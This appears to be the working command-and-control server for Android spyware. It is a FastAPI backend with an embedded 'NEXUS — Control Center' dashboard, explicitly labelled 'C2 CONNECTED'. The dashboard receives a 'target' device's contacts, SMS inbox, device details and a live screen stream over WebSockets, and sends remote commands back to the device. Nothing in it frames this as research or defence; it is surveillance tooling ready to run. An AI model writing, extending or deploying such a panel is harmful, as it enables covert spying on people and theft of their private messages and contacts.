from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.responses import HTMLResponse
import json

app = FastAPI()

class ConnectionManager:
    def __init__(self):
        self.devices = {}
        self.admin = None

    async def connect_device(self, device_id: str, websocket: WebSocket):
        await websocket.accept()
        self.devices[device_id] = websocket

    def disconnect_device(self, device_id: str):
        if device_id in self.devices:
            del self.devices[device_id]

    async def connect_admin(self, websocket: WebSocket):
        await websocket.accept()
        self.admin = websocket

    def disconnect_admin(self):
        self.admin = None

    async def broadcast_to_admin(self, message: dict):
        if self.admin:
            await self.admin.send_json(message)

    async def send_to_device(self, device_id: str, message: dict):
        if device_id in self.devices:
            await self.devices[device_id].send_json(message)

manager = ConnectionManager()

# 1. Android App Telemetry WebSocket Endpoint
@app.websocket("/ws/device/{device_id}")
async def device_websocket(websocket: WebSocket, device_id: str):
    await manager.connect_device(device_id, websocket)
    try:
        while True:
            data = await websocket.receive_text()
            payload = json.loads(data)
            await manager.broadcast_to_admin({"device_id": device_id, "payload": payload})
    except WebSocketDisconnect:
        manager.disconnect_device(device_id)

# 2. Web Dashboard Admin WebSocket Endpoint
@app.websocket("/ws/admin")
async def admin_websocket(websocket: WebSocket):
    await manager.connect_admin(websocket)
    try:
        while True:
            data = await websocket.receive_text()
            command = json.loads(data)
            target_device = command.get("device_id")
            await manager.send_to_device(target_device, command)
    except WebSocketDisconnect:
        manager.disconnect_admin()

# 3. Live Video Streaming WebSocket Endpoint (Zero Saving / In-Memory Stream)
@app.websocket("/ws/stream")
async def stream_endpoint(websocket: WebSocket):
    await websocket.accept()
    try:
        while True:
            frame_data = await websocket.receive_text()
            # Disk-la save panrathu illai! Direct-ah admin dashboard-ku live video frame-a relay panrom
            if manager.admin:
                await manager.admin.send_json({"type": "live_video_frame", "frame": frame_data})
    except WebSocketDisconnect:
        pass

# 4. Full NEXUS UI HTML Template
HTML_TEMPLATE = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>NEXUS — Control Center</title>
<style>
:root{
  --bg:#07090d; --panel:#0d1117; --panel2:#131a24; --line:rgba(255,255,255,.07);
  --txt:#e6edf7; --dim:#7d8899; --cyan:#22d3ee; --violet:#8b5cf6;
  --green:#22c55e; --red:#ef4444; --amber:#f59e0b;
}
*{margin:0;padding:0;box-sizing:border-box}
body{
  background:var(--bg); color:var(--txt); overflow:hidden;
  font-family:'Inter',system-ui,-apple-system,'Segoe UI',sans-serif;
  -webkit-font-smoothing:antialiased;
}
body::before{
  content:""; position:fixed; inset:0; pointer-events:none; z-index:0;
  background:
    radial-gradient(600px 400px at 15% 0%, rgba(34,211,238,.10), transparent 70%),
    radial-gradient(700px 500px at 90% 100%, rgba(139,92,246,.12), transparent 70%);
}
::-webkit-scrollbar{width:8px;height:8px}
::-webkit-scrollbar-thumb{background:#1c2432;border-radius:8px}
::-webkit-scrollbar-thumb:hover{background:#2a3546}

.app{display:grid;grid-template-columns:248px 1fr;height:100vh;position:relative;z-index:1}

/* ============ SIDEBAR ============ */
.sidebar{
  background:linear-gradient(180deg,#0b0f15,#080b10);
  border-right:1px solid var(--line);
  display:flex;flex-direction:column;padding:20px 14px;
}
.brand{display:flex;align-items:center;gap:12px;padding:4px 8px 22px}
.brand-mark{
  width:40px;height:40px;border-radius:12px;display:grid;place-items:center;
  font-weight:800;font-size:18px;color:#04121a;
  background:linear-gradient(135deg,var(--cyan),var(--violet));
  box-shadow:0 0 24px rgba(34,211,238,.35);
}
.brand-text b{display:block;font-size:15px;letter-spacing:.14em}
.brand-text span{font-size:10px;color:var(--dim);letter-spacing:.08em}

.nav{display:flex;flex-direction:column;gap:4px;flex:1}
.nav-item{
  display:flex;align-items:center;gap:12px;padding:11px 12px;border-radius:11px;
  background:transparent;border:1px solid transparent;color:var(--dim);
  font-size:13.5px;font-weight:500;cursor:pointer;text-align:left;
  transition:.18s; font-family:inherit;
}
.nav-item svg{width:18px;height:18px;stroke:currentColor;fill:none;stroke-width:1.7;
  stroke-linecap:round;stroke-linejoin:round;flex-shrink:0}
.nav-item:hover{background:rgba(255,255,255,.04);color:var(--txt)}
.nav-item.active{
  background:linear-gradient(90deg,rgba(34,211,238,.14),rgba(139,92,246,.10));
  border-color:rgba(34,211,238,.28); color:#fff;
  box-shadow:inset 0 0 20px rgba(34,211,238,.06);
}
.nav-item.active svg{stroke:var(--cyan)}

.side-foot{border-top:1px solid var(--line);padding-top:14px;margin-top:10px}
.demo-badge{
  font-size:9.5px;letter-spacing:.16em;text-align:center;padding:6px;border-radius:8px;
  color:var(--amber);background:rgba(245,158,11,.10);
  border:1px solid rgba(245,158,11,.25);margin-bottom:12px;font-weight:700;
}
.side-user{display:flex;align-items:center;gap:10px;padding:0 4px}
.side-user .ava{
  width:32px;height:32px;border-radius:50%;display:grid;place-items:center;
  background:linear-gradient(135deg,#1f2937,#111827);border:1px solid var(--line);
  font-size:11px;font-weight:700;color:var(--cyan);
}
.side-user small{display:block;font-size:10px;color:var(--dim)}
.side-user b{font-size:12px}

/* ============ MAIN ============ */
.main{display:flex;flex-direction:column;overflow:hidden}
.topbar{
  height:70px;flex-shrink:0;display:flex;align-items:center;justify-content:space-between;
  padding:0 28px;border-bottom:1px solid var(--line);
  background:rgba(10,13,18,.7);backdrop-filter:blur(14px);
}
.tb-left{display:flex;align-items:baseline;gap:10px}
.tb-left h1{font-size:19px;font-weight:650;letter-spacing:-.01em}
.crumb{font-size:12px;color:var(--dim)}
.tb-right{display:flex;align-items:center;gap:10px}
.chip{
  display:flex;align-items:center;gap:7px;font-size:11.5px;color:var(--dim);
  padding:7px 12px;border-radius:9px;border:1px solid var(--line);
  background:rgba(255,255,255,.02);font-variant-numeric:tabular-nums;
}
.chip.live{color:var(--green);border-color:rgba(34,197,94,.28);background:rgba(34,197,94,.08)}
.chip.live i{width:6px;height:6px;border-radius:50%;background:var(--green);
  box-shadow:0 0 8px var(--green);animation:pulse 1.6s infinite}
@keyframes pulse{50%{opacity:.25}}
.avatar-sm{
  width:34px;height:34px;border-radius:10px;display:grid;place-items:center;
  font-size:11px;font-weight:700;color:#04121a;
  background:linear-gradient(135deg,var(--cyan),var(--violet));
}

.views{flex:1;overflow-y:auto;padding:24px 28px 60px}
.view{display:none;animation:fade .28s ease}
.view.active{display:block}
@keyframes fade{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:none}}

/* ============ CARDS / COMMON ============ */
.card{
  background:linear-gradient(180deg,rgba(255,255,255,.035),rgba(255,255,255,.012));
  border:1px solid var(--line);border-radius:16px;
  box-shadow:0 12px 30px -14px rgba(0,0,0,.8);
}
.sec-head{display:flex;align-items:center;justify-content:space-between;margin:26px 0 14px}
.sec-head h2{font-size:13px;font-weight:650;letter-spacing:.06em;text-transform:uppercase;color:#b9c4d4}
.btn{
  font-family:inherit;font-size:12px;font-weight:600;padding:8px 14px;border-radius:9px;
  border:1px solid var(--line);background:rgba(255,255,255,.04);color:var(--txt);
  cursor:pointer;transition:.18s;
}
.btn:hover{background:rgba(255,255,255,.09);border-color:rgba(34,211,238,.3)}
.btn.grad{
  background:linear-gradient(135deg,var(--cyan),var(--violet));color:#04121a;border:none;
  box-shadow:0 6px 20px -6px rgba(34,211,238,.5);
}
.btn.grad:hover{filter:brightness(1.1)}

/* ============ STATS ============ */
.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:14px}
.stat{
  display:flex;align-items:center;gap:14px;padding:18px;border-radius:16px;
  border:1px solid var(--line);
  background:linear-gradient(180deg,rgba(255,255,255,.04),rgba(255,255,255,.01));
  transition:.2s;
}
.stat:hover{border-color:rgba(34,211,238,.3);transform:translateY(-2px)}
.stat-ico{
  width:42px;height:42px;border-radius:12px;display:grid;place-items:center;font-size:17px;
  background:rgba(34,211,238,.10);border:1px solid rgba(34,211,238,.2);
}
.stat-k{font-size:11px;color:var(--dim);letter-spacing:.05em;text-transform:uppercase}
.stat-v{font-size:22px;font-weight:700;letter-spacing:-.02em;margin-top:2px}
.stat-v span{font-size:13px;color:var(--dim);font-weight:500}

/* ============ DEVICE CARDS ============ */
.devices{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:14px}
.device-card{
  padding:18px;border-radius:16px;cursor:pointer;transition:.2s;position:relative;
  border:1px solid var(--line);
  background:linear-gradient(180deg,rgba(255,255,255,.04),rgba(255,255,255,.01));
}
.device-card:hover{border-color:rgba(34,211,238,.35);transform:translateY(-3px);
  box-shadow:0 18px 40px -20px rgba(34,211,238,.4)}
.device-card.selected{border-color:rgba(34,211,238,.55);
  box-shadow:0 0 0 1px rgba(34,211,238,.25),0 18px 40px -20px rgba(34,211,238,.4)}
.dc-top{display:flex;align-items:center;gap:12px;margin-bottom:16px}
.dc-ico{width:38px;height:38px;border-radius:11px;display:grid;place-items:center;font-size:16px;
  background:rgba(139,92,246,.12);border:1px solid rgba(139,92,246,.25)}
.dc-meta h3{font-size:14px;font-weight:600}
.dc-meta p{font-size:11px;color:var(--dim);margin-top:2px}
.dot{width:8px;height:8px;border-radius:50%;margin-left:auto}
.dot.online{background:var(--green);box-shadow:0 0 10px var(--green)}
.dc-bat{display:flex;align-items:center;gap:10px;margin-bottom:14px}
.bar{flex:1;height:6px;border-radius:6px;background:#1a2130;overflow:hidden}
.bar i{display:block;height:100%;border-radius:6px;transition:width .5s}
.dc-bat span{font-size:11.5px;color:var(--dim);font-variant-numeric:tabular-nums}
.dc-info{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;padding-top:12px;
  border-top:1px solid var(--line)}
.dc-info label{display:block;font-size:9.5px;color:var(--dim);letter-spacing:.08em;text-transform:uppercase;margin-bottom:3px}
.dc-info b{font-size:11.5px;font-weight:600;font-variant-numeric:tabular-nums}
.dc-info b.no{color:var(--green)}

/* ============ FEED ============ */
.feed{display:flex;flex-direction:column;gap:2px;padding:6px 0}
.feed-item{display:flex;align-items:center;gap:12px;padding:11px 14px;border-radius:11px;font-size:12.5px}
.feed-item:hover{background:rgba(255,255,255,.03)}
.feed-item .fi{width:28px;height:28px;border-radius:8px;display:grid;place-items:center;font-size:12px;
  background:rgba(34,211,238,.08);border:1px solid rgba(34,211,238,.16);flex-shrink:0}
.feed-item span{color:var(--dim)}
.feed-item b{font-weight:600;color:var(--txt)}
.feed-item time{margin-left:auto;font-size:11px;color:#525d6d;white-space:nowrap}

/* ============ CONTACTS ============ */
.toolbar{display:flex;gap:10px;margin-bottom:16px;flex-wrap:wrap}
.input{
  flex:1;min-width:200px;padding:11px 15px;border-radius:11px;font-family:inherit;font-size:13px;
  background:rgba(255,255,255,.03);border:1px solid var(--line);color:var(--txt);outline:none;
}
.input:focus{border-color:rgba(34,211,238,.45);box-shadow:0 0 0 3px rgba(34,211,238,.08)}
.contacts{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:12px}
.contact{
  display:flex;align-items:center;gap:13px;padding:14px;border-radius:14px;cursor:pointer;
  border:1px solid var(--line);transition:.18s;
  background:linear-gradient(180deg,rgba(255,255,255,.035),rgba(255,255,255,.008));
}
.contact:hover{border-color:rgba(34,211,238,.32);transform:translateY(-2px)}
.c-ava{
  width:40px;height:40px;border-radius:12px;display:grid;place-items:center;flex-shrink:0;
  font-size:13px;font-weight:700;color:#04121a;
  background:linear-gradient(135deg,var(--cyan),var(--violet));
}
.c-info h4{font-size:13.5px;font-weight:600;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.c-info p{font-size:11.5px;color:var(--dim);font-variant-numeric:tabular-nums;margin-top:2px}
.c-tag{margin-left:auto;font-size:9.5px;padding:4px 9px;border-radius:20px;letter-spacing:.06em;
  color:var(--cyan);background:rgba(34,211,238,.10);border:1px solid rgba(34,211,238,.2);
  white-space:nowrap}

/* ============ MESSAGES ============ */
.msg-wrap{display:grid;grid-template-columns:300px 1fr;gap:14px;height:calc(100vh - 190px)}
.convos{padding:8px;overflow-y:auto}
.convo{
  display:flex;gap:11px;align-items:center;padding:12px;border-radius:12px;cursor:pointer;transition:.15s;
}
.convo:hover{background:rgba(255,255,255,.04)}
.convo.active{background:linear-gradient(90deg,rgba(34,211,238,.12),rgba(139,92,246,.08));
  border:1px solid rgba(34,211,238,.25)}
.chat{display:flex;flex-direction:column;overflow:hidden}
.chat-head{padding:16px 20px;border-bottom:1px solid var(--line);display:flex;align-items:center;gap:12px}
.chat-body{flex:1;overflow-y:auto;padding:20px;display:flex;flex-direction:column;gap:10px}
.bubble{max-width:70%;padding:11px 15px;border-radius:14px;font-size:12.8px;line-height:1.5}
.bubble.them{align-self:flex-start;background:rgba(255,255,255,.055);border:1px solid var(--line);border-bottom-left-radius:5px}
.bubble time{display:block;font-size:9.5px;opacity:.55;margin-top:4px}
.chat-input{padding:14px 16px;border-top:1px solid var(--line);display:flex;gap:10px}

/* ============ DEVICE DETAIL ============ */
.detail-grid{display:grid;grid-template-columns:1fr 340px;gap:14px}
.info-list{padding:6px 0}
.info-row{display:flex;justify-content:space-between;align-items:center;padding:13px 20px;font-size:12.5px}
.info-row+.info-row{border-top:1px solid rgba(255,255,255,.04)}
.info-row span{color:var(--dim)}
.info-row b{font-weight:600;font-variant-numeric:tabular-nums}
.pill{font-size:10.5px;padding:3px 10px;border-radius:20px;font-weight:700;letter-spacing:.04em}
.pill.g{color:var(--green);background:rgba(34,197,94,.12);border:1px solid rgba(34,197,94,.25)}

.ring-wrap{padding:22px;display:flex;flex-direction:column;align-items:center;gap:14px}
.ring{
  width:130px;height:130px;border-radius:50%;display:grid;place-items:center;position:relative;
  background:conic-gradient(var(--green) 0 82%, #182030 82% 100%);
}
.ring::after{content:"";position:absolute;inset:9px;border-radius:50%;background:#0b0f15}
.ring-in{position:relative;z-index:1;text-align:center}
.ring-in b{font-size:26px;font-weight:700;letter-spacing:-.02em}
.ring-in small{display:block;font-size:10px;color:var(--dim);letter-spacing:.1em;text-transform:uppercase}

/* ============ CONTROLS ============ */
.controls{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:14px}
.ctrl{
  padding:18px;border-radius:16px;border:1px solid var(--line);transition:.2s;
  background:linear-gradient(180deg,rgba(255,255,255,.04),rgba(255,255,255,.01));
  display:flex;align-items:center;gap:14px;
}
.ctrl:hover{border-color:rgba(34,211,238,.3);transform:translateY(-2px)}
.ctrl-ico{width:44px;height:44px;border-radius:13px;display:grid;place-items:center;font-size:19px;
  background:rgba(139,92,246,.12);border:1px solid rgba(139,92,246,.25);flex-shrink:0}
.ctrl-txt{flex:1;min-width:0}
.ctrl-txt h4{font-size:13px;font-weight:600}
.ctrl-txt p{font-size:11px;color:var(--dim);margin-top:3px}
.mini-btn{
  padding:7px 12px;border-radius:9px;font-size:11px;font-weight:600;cursor:pointer;
  font-family:inherit;color:var(--txt);background:rgba(255,255,255,.05);
  border:1px solid var(--line);transition:.18s;flex-shrink:0;
}
.mini-btn:hover{background:rgba(34,211,238,.15);border-color:rgba(34,211,238,.4);color:var(--cyan)}

/* ============ TOAST ============ */
.toasts{position:fixed;bottom:24px;right:24px;display:flex;flex-direction:column;gap:10px;z-index:99}
.toast{
  min-width:250px;padding:13px 17px;border-radius:13px;font-size:12.5px;
  background:rgba(16,22,30,.96);border:1px solid rgba(34,211,238,.35);
  backdrop-filter:blur(14px);box-shadow:0 20px 40px -18px rgba(0,0,0,.9);
  display:flex;align-items:center;gap:11px;animation:slideIn .3s ease;
}
.toast i{width:7px;height:7px;border-radius:50%;background:var(--cyan);
  box-shadow:0 0 10px var(--cyan);flex-shrink:0}
@keyframes slideIn{from{opacity:0;transform:translateX(40px)}to{opacity:1;transform:none}}
</style>
</head>
<body>

<div class="app">
  <!-- SIDEBAR -->
  <aside class="sidebar">
    <div class="brand">
      <div class="brand-mark">N</div>
      <div class="brand-text"><b>NEXUS</b><span>CONTROL CENTER</span></div>
    </div>

    <nav class="nav">
      <button class="nav-item active" data-view="dashboard">
        <svg viewBox="0 0 24 24"><rect x="3" y="3" width="7" height="7" rx="1.5"/><rect x="14" y="3" width="7" height="7" rx="1.5"/><rect x="3" y="14" width="7" height="7" rx="1.5"/><rect x="14" y="14" width="7" height="7" rx="1.5"/></svg>
        <span>Dashboard</span>
      </button>
      <button class="nav-item" data-view="contacts">
        <svg viewBox="0 0 24 24"><circle cx="12" cy="8" r="4"/><path d="M4 21c0-4 3.6-6.5 8-6.5s8 2.5 8 6.5"/></svg>
        <span>Contacts</span>
      </button>
      <button class="nav-item" data-view="messages">
        <svg viewBox="0 0 24 24"><path d="M21 11.5a8.4 8.4 0 0 1-9 8.4 9 9 0 0 1-4-.9L3 21l1.9-4.6A8.4 8.4 0 1 1 21 11.5z"/></svg>
        <span>Messages</span>
      </button>
      <button class="nav-item" data-view="device">
        <svg viewBox="0 0 24 24"><rect x="6" y="2" width="12" height="20" rx="3"/><path d="M10.5 18h3"/></svg>
        <span>Device</span>
      </button>
      <button class="nav-item" data-view="screen">
        <svg viewBox="0 0 24 24"><rect x="2" y="4" width="20" height="13" rx="2.5"/><path d="M8 21h8M12 17v4"/></svg>
        <span>Screen</span>
      </button>
      <button class="nav-item" data-view="controls">
        <svg viewBox="0 0 24 24"><path d="M4 7h16M4 12h16M4 17h16"/><circle cx="9" cy="7" r="2.2" fill="#0b0f15"/><circle cx="15" cy="12" r="2.2" fill="#0b0f15"/><circle cx="7" cy="17" r="2.2" fill="#0b0f15"/></svg>
        <span>Controls</span>
      </button>
    </nav>

    <div class="side-foot">
      <div class="demo-badge">LIVE — C2 CONNECTED</div>
      <div class="side-user">
        <div class="ava">OP</div>
        <div><b>Operator</b><small>Admin access</small></div>
      </div>
    </div>
  </aside>

  <!-- MAIN -->
  <main class="main">
    <header class="topbar">
      <div class="tb-left">
        <h1 id="pageTitle">Dashboard</h1>
        <span class="crumb" id="pageCrumb">/ overview</span>
      </div>
      <div class="tb-right">
        <div class="chip live"><i></i> Live Sync</div>
        <div class="chip"><span id="clock">--:--:--</span></div>
        <div class="avatar-sm">OP</div>
      </div>
    </header>

    <div class="views">
      <!-- DASHBOARD VIEW -->
      <section class="view active" id="v-dashboard">
        <div class="stats">
          <div class="stat"><div class="stat-ico">📶</div><div>
            <div class="stat-k">Devices Online</div><div class="stat-v" id="statOnline">1<span>/1</span></div></div></div>
          <div class="stat"><div class="stat-ico">🔋</div><div>
            <div class="stat-k">Battery</div><div class="stat-v" id="statBattery">--<span>%</span></div></div></div>
          <div class="stat"><div class="stat-ico">📡</div><div>
            <div class="stat-k">Carrier Network</div><div class="stat-v" id="statCarrier" style="font-size:16px">--</div></div></div>
          <div class="stat"><div class="stat-ico">🔔</div><div>
            <div class="stat-k">Alerts</div><div class="stat-v">0<span>new</span></div></div></div>
        </div>

        <div class="sec-head"><h2>Connected Target Device</h2></div>
        <div class="devices" id="deviceGrid">
          <article class="device-card selected" data-id="d1">
            <div class="dc-top">
              <div class="dc-ico">📱</div>
              <div class="dc-meta"><h3 id="cardDevName">Waiting for device...</h3><p id="cardDevModel">Android · --</p></div>
              <span class="dot online"></span>
            </div>
            <div class="dc-bat">
              <div class="bar"><i id="cardBatBar" style="width:0%;background:var(--green)"></i></div>
              <span id="cardBatText">--%</span>
            </div>
            <div class="dc-info">
              <div><label>Carrier</label><b id="cardCarrier">--</b></div>
              <div><label>OS</label><b id="cardOs">--</b></div>
              <div><label>Status</label><b class="no">LIVE</b></div>
            </div>
          </article>
        </div>

        <div class="sec-head"><h2>Live Activity Feed</h2></div>
        <div class="card feed" id="liveFeed">
          <div class="feed-item"><div class="fi">📡</div>
            <div><b>System</b> <span>— waiting for WebSocket telemetry data...</span></div><time>Now</time></div>
        </div>
      </section>

      <!-- CONTACTS VIEW -->
      <section class="view" id="v-contacts">
        <div class="toolbar">
          <input class="input" id="contactSearch" placeholder="Search live contacts...">
          <button class="btn grad" onclick="toast('Contacts synced')">Sync Contacts</button>
        </div>
        <div class="contacts" id="contactGrid">
          <div style="color:var(--dim);font-size:13px;padding:20px">No contacts synced yet. Open app on target device.</div>
        </div>
      </section>

      <!-- MESSAGES VIEW -->
      <section class="view" id="v-messages">
        <div class="msg-wrap">
          <div class="card convos" id="convoList">
            <div style="color:var(--dim);font-size:13px;padding:14px">Waiting for SMS inbox...</div>
          </div>
          <div class="card chat">
            <div class="chat-head" id="chatHead">
              <div class="c-ava">SMS</div>
              <div><div style="font-size:13.5px;font-weight:600">Target Inbox</div><div style="font-size:11px;color:var(--dim)">Live SMS Relay</div></div>
            </div>
            <div class="chat-body" id="chatBody">
              <div style="color:var(--dim);text-align:center;margin-top:40px">Select a conversation from the left</div>
            </div>
          </div>
        </div>
      </section>

      <!-- DEVICE VIEW -->
      <section class="view" id="v-device">
        <div class="detail-grid">
          <div class="card">
            <div class="sec-head" style="margin:0;padding:18px 20px 14px">
              <h2>Live Device Information</h2>
              <span class="pill g" id="devStatusPill">CONNECTED</span>
            </div>
            <div class="info-list" id="infoList">
              <div class="info-row"><span>Status</span><b>Awaiting telemetry...</b></div>
            </div>
          </div>
          <div class="card ring-wrap">
            <div class="ring"><div class="ring-in"><b id="ringPct">--%</b><small>Battery</small></div></div>
            <div style="text-align:center;font-size:11.5px;color:var(--dim)" id="ringSub">Live Monitoring</div>
          </div>
        </div>
      </section>

      <!-- SCREEN STREAM VIEW -->
      <section class="view" id="v-screen">
        <div class="sec-head" style="margin-top:0"><h2>Live Screen Stream (Zero Saving)</h2></div>
        <div class="card" style="padding:20px;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:400px;">
          <img id="liveScreenImg" style="max-width:100%;max-height:500px;border-radius:12px;border:1px solid var(--line);background:#000;" alt="Waiting for live screen stream..."/>
          <div style="margin-top:14px;font-size:12px;color:var(--dim);" id="streamStatus">Status: Connecting to live stream...</div>
        </div>
      </section>

      <!-- CONTROLS VIEW -->
      <section class="view" id="v-controls">
        <div class="sec-head" style="margin-top:0"><h2>Remote Controls</h2></div>
        <div class="controls">
          <div class="ctrl" onclick="sendControl('vibration')">
            <div class="ctrl-ico">📳</div>
            <div class="ctrl-txt"><h4>Vibration</h4><p>Trigger vibrator motor</p></div>
            <button class="mini-btn">Trigger</button>
          </div>
        </div>
      </section>
    </div>
  </main>
</div>

<div class="toasts" id="toasts"></div>

<script>
const $ = s => document.querySelector(s);
const $$ = s => document.querySelectorAll(s);

function toast(msg){
  const el = document.createElement('div');
  el.className = 'toast';
  el.innerHTML = `<i></i><span>${msg}</span>`;
  $('#toasts').appendChild(el);
  setTimeout(()=>{ el.style.opacity='0'; el.style.transform='translateX(40px)';
    el.style.transition='.3s'; setTimeout(()=>el.remove(),300); }, 2600);
}

$$('.nav-item').forEach(btn=>{
  btn.addEventListener('click',()=>{
    $$('.nav-item').forEach(b=>b.classList.remove('active'));
    btn.classList.add('active');
    const v = btn.dataset.view;
    $$('.view').forEach(s=>s.classList.remove('active'));
    $('#v-'+v).classList.add('active');
    $('#pageTitle').textContent = v.charAt(0).toUpperCase() + v.slice(1);
    $('.views').scrollTop = 0;
  });
});

setInterval(()=>{
  $('#clock').textContent = new Date().toLocaleTimeString('en-GB');
},1000);

// Admin WebSocket Connection for Telemetry & Controls
const protocol = window.location.protocol === 'https:' ? 'wss://' : 'ws://';
const wsUrl = protocol + window.location.host + '/ws/admin';
const ws = new WebSocket(wsUrl);

ws.onopen = () => { toast("Connected to C2 Relay Server"); };
ws.onclose = () => { toast("Disconnected from server"); };

ws.onmessage = (event) => {
  const message = JSON.parse(event.data);
  
  // Handle Telemetry Sync
  if(message.payload && message.payload.type === "live_sync") {
    const payload = message.payload;
    $('#statBattery').innerHTML = payload.battery + '<span>%</span>';
    $('#statCarrier').textContent = payload.carrier;
    $('#cardDevName').textContent = payload.model;
    $('#cardDevModel').textContent = `Android ${payload.os} · ${payload.brand}`;
    $('#cardBatBar').style.width = payload.battery + '%';
    $('#cardBatText').textContent = payload.battery + '%';
    $('#cardCarrier').textContent = payload.carrier;
    $('#cardOs').textContent = payload.os;
    $('#ringPct').textContent = payload.battery + '%';
    $('#ringSub').textContent = `Carrier: ${payload.carrier} · OS: ${payload.os}`;

    const rows = [
      ['Device Model', payload.model],
      ['Brand', payload.brand],
      ['OS Version', 'Android ' + payload.os],
      ['Carrier / Network', payload.carrier],
      ['Battery Level', payload.battery + '%']
    ];
    $('#infoList').innerHTML = rows.map(([k,v])=>`<div class="info-row"><span>${k}</span><b>${v}</b></div>`).join('');

    if(payload.contacts && payload.contacts.length > 0) {
      $('#contactGrid').innerHTML = payload.contacts.map(c=>`
        <div class="contact">
          <div class="c-ava">${c.name ? c.name[0] : '?'}</div>
          <div class="c-info"><h4>${c.name}</h4><p>${c.phone}</p></div>
          <span class="c-tag">Live</span>
        </div>`).join('');
    }

    if(payload.sms && payload.sms.length > 0) {
      $('#convoList').innerHTML = payload.sms.map((s)=>`
        <div class="convo">
          <div class="c-ava">${s.sender[0]}</div>
          <div class="c-info"><h4>${s.sender}</h4><p>${s.message}</p></div>
        </div>`).join('');
    }
  }

  // Handle Live Video Frame Stream
  if(message.type === "live_video_frame") {
    $('#liveScreenImg').src = "data:image/jpeg;base64," + message.frame;
    $('#streamStatus').textContent = "Status: Streaming live frames (Zero saving)";
  }
};

function sendControl(action) {
  ws.send(JSON.stringify({ device_id: "pixel_7_pro", action: action }));
  toast(`Command [${action}] sent to target`);
}
</script>
</body>
</html>
"""

@app.get("/", response_class=HTMLResponse)
async def home():
    return HTML_TEMPLATE
